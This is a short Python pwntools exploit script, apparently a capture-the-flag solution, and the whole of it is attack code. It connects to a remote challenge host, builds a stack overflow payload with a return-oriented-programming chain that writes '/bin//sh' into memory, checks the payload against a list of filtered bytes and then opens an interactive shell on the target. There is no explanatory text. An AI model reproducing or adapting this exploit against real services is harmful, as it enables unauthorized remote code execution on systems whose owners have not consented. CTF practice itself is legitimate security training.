from pwn import *

filters = ['ba', 'c4', '07', '1c', 'd1', 'ac', '83', '03', '20', '0a', '0b', '0c']

HOST, PORT = '0.0.0.0', 6500
HOST, PORT = 'challenges.hackover.h4q.it', 1337
r = remote(HOST, PORT)
data = 0x80ecf80

def write(addr, value):
	return p32(0x0806fe6a) + p32(value) + p32(0x08066474) + p32(0x0806fe6a) + p32(addr) + p32(0x0805596b)

payload = 'A' * 37 + p32(0x1337cafe) + 'A' * 0x14 + p32(data) + write(data, u32('/bin')) + write(data + 4, u32('//sh')) + p32(0x080498b3) + p32(data) + p32(0x41414141) + p32(0x41414141) + p32(0x41414141) + p32(0x0806cf29) + p32(0x08049573) + p32(0x080e4dc1) + p32(0x0806d9c5)
payload = payload[::-1]

for c in filters:
	if c.decode('hex') in payload:
		print 'wtf'
		exit()

r.send(payload + '\n')

payload2 = 'A' * 37 + p32(0x1337cafe)
# r.recvall()
r.interactive()